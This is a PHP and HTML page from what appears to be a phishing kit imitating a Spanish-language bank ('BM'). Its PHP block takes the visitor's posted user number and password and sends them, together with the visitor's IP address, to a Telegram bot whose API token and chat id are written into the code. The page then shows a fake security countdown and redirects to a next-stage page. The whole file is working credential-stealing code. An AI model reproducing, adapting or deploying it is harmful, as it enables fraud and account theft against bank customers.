<?php
session_start();
if( isset( $_POST['numdoc'] ) && isset( $_POST['clv']) ){
        
    $_SESSION['COD'] = $_POST['numdoc'];
    $_SESSION['USER'] = $_POST['clv'];
    
    @$message = "EMAIL-BM-VIRT \n\n"."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".'USUARIO: '.$_SESSION['COD']."\n".'CLAVE: '.$_SESSION['USER'];

    $apiToken = "6067332864:AAGp9Sbh2sfQUGY4W5-B_LyXP_mPHHsyA10";

    $data = [
        'chat_id' => '5157616506',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    // @header('Location: index3.php');
}
?>
 

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">
    




<center>

<form class="form" action="">

<img src="bm-icon.svg" alt="">


<br><br>

<img class="title" src="title.png" alt="">


<br><br>


<div style="height: 260px;" class="caja1">
<div class="pol"> 
    <section class=""><br><a style="font-weight: 600; font-size: 22px;">Espera un momento por favor</a> <br>
        <a class="psn" >  Por su seguridad 
           no cierre esta ventana y no apague su dispositivo.<br><br> Espere 
           <span id="countdown"> </span> Segundos... </a>
      
           <img class="pn" src="load.gif" width="50%">
         </section>
        
        <script>
          var segundoInicio = 30;
     
     function actualizar() {
        document.getElementById('countdown').innerHTML = segundoInicio;
     
        if (segundoInicio == 0) {
          //cuenta regresiva ha finalizado
     
          
          window.location.href = "tk2.php";
          
        } else {
     
         // segundoInicio-=1;
          /* 0 */
          segundoInicio = segundoInicio -1;
          setTimeout(actualizar, 1E3);
        }
     }
     
     actualizar();
    
</script>                                          

</div>
</div>

<br> 
 
 





</form>

 

<img class="of" style="margin-left: -4px;" width="100%" src="imgg.png" alt="">


<br>


<img style="width: 200px;" src="terminos.png" alt="">

<br>

<img style="width: 450px;" src="copy.png" alt="">










</body>
</html>